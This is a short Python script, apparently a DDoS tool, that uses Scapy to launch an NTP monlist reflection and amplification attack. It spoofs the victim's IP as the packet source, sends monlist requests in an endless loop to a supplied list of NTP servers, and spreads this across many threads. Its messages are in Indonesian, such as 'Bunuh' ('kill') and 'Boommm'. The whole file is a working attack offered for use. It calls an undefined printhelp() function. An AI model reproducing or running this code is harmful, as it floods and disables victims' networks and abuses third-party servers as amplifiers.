from scapy.all import *
import sys
import threading
import time
import random
#ntpdos.py <target ip> <ntpserver list> <number of threads>
#thanks JDMoore0883 and DaRkReD
def deny():
    #Import globals to function
    global ntplist
    global currentserver
    global data
    global target
    ntpserver = ntplist[currentserver] #Get new server
    currentserver = currentserver + 1 #Increment for next 
    packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
    send(packet,loop=1) #SEND IT
try:
    if len(sys.argv) < 4:
        printhelp()
    #Fetch Args
    target = sys.argv[1]
    #Help out idiots
    if target in ("help","-h","h","?","--h","--help","/?"):
        printhelp()
    ntpserverfile = sys.argv[2]
    numberthreads = int(sys.argv[3])
    #System for accepting bulk input
    ntplist = []
    currentserver = 0
    with open(ntpserverfile) as f:
        ntplist = f.readlines()
    #Make sure we dont out of bounds
    if  numberthreads > int(len(ntplist)):
        print "Dibatalkan"
        exit(0)
    #Magic Packet aka NTP v2 Monlist Packet
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    #Hold our threads
    threads = []
    print "Bunuh: "+ target + " menggunakan datar NTP: " + ntpserverfile + " dengan " + str(numberthreads) + " threads"
    #Thread spawner
    for n in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    #In progress!
    print "Boommm..."
    #Keep alive so ctrl+c still kills all them threads
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Berhenti [vol down + c]")
    # Script ends here